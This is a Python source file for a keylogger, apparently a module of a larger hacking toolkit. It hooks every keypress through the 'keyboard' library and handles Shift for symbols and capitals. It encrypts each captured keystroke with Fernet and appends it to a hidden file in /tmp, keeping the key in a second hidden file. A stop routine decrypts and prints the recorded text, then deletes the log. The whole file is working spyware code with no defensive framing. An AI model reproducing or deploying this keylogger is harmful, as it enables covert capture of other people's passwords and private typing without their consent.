import os
import keyboard
from cryptography.fernet import Fernet
from core.assets.colors import red

LOG_FILE = "/tmp/.keylog.enc"  # Hidden encrypted log file
FLAG_FILE = "/tmp/keylogger_running"
KEY_FILE = "/tmp/.keylog_key"  # Encryption key file

running = False
shift_pressed = False

# Map numbers to symbols when Shift is pressed
SHIFT_SYMBOLS = {
    "1": "!", "2": "@", "3": "#", "4": "$", "5": "%",
    "6": "^", "7": "&", "8": "*", "9": "(", "0": ")"
}

# Generate encryption key if not exists
def generate_key():
    if not os.path.exists(KEY_FILE):
        key = Fernet.generate_key()
        with open(KEY_FILE, "wb") as keyfile:
            keyfile.write(key)

# Load encryption key
def load_key():
    with open(KEY_FILE, "rb") as keyfile:
        return keyfile.read()

# Encrypt data and write immediately
def encrypt_and_save(data):
    key = load_key()
    cipher = Fernet(key)
    encrypted_data = cipher.encrypt(data.encode())

    # Save encrypted data immediately to avoid data loss
    with open(LOG_FILE, "ab") as file:
        file.write(encrypted_data + b"\n")

# Decrypt the entire log file and return plaintext
def decrypt_data():
    key = load_key()
    cipher = Fernet(key)

    if not os.path.exists(LOG_FILE):
        return ""

    with open(LOG_FILE, "rb") as file:
        encrypted_lines = file.readlines()

    decrypted_text = ""
    for line in encrypted_lines:
        try:
            decrypted_text += cipher.decrypt(line).decode()
        except:
            pass  # Ignore corrupted lines

    return decrypted_text

def log_key(event):
    """ Capture keystrokes with accurate shift key handling """
    global shift_pressed

    key = event.name
    if key in ["shift", "shift left", "shift right"]:
        shift_pressed = event.event_type == "down"
        return

    if event.event_type == "down":
        log_text = ""
        if key in SHIFT_SYMBOLS and shift_pressed:
            log_text = SHIFT_SYMBOLS[key]
        elif len(key) == 1 and key.isprintable():
            log_text = key.upper() if shift_pressed else key
        elif key == "space":
            log_text = " "
        elif key == "enter":
            log_text = "\n"
        elif key not in ["backspace", "tab", "caps lock", "ctrl", "alt", "esc", "windows", "cmd", "option", "meta"]:
            log_text = f"[{key}]"

        if log_text:
            encrypt_and_save(log_text)  # Encrypt and write immediately

def start_keylogger():
    """ Start keylogger process """
    global running
    if os.path.exists(FLAG_FILE):
        print(red("Keylogger is already running!"))
        return

    generate_key()  # Generate encryption key at startup
    with open(FLAG_FILE, "w") as f:
        f.write("running")

    print(red("Keylogger Started! Press keys..."))
    running = True
    keyboard.on_press(log_key)
    keyboard.wait()  # Keeps the keylogger running

def stop_keylogger():
    """ Stop keylogger and show recorded logs after decryption """
    global running
    if os.path.exists(FLAG_FILE):
        os.remove(FLAG_FILE)

    running = False
    keyboard.unhook_all()

    if os.path.exists(LOG_FILE):
        print("\n--==[ Keystrokes Recorded ]==--\n")
        logs = decrypt_data().strip()
        print(logs if logs else red("No keystrokes recorded!"))
        os.remove(LOG_FILE)
        print(red("\nLog file deleted!"))
    else:
        print(red("No log file found!"))
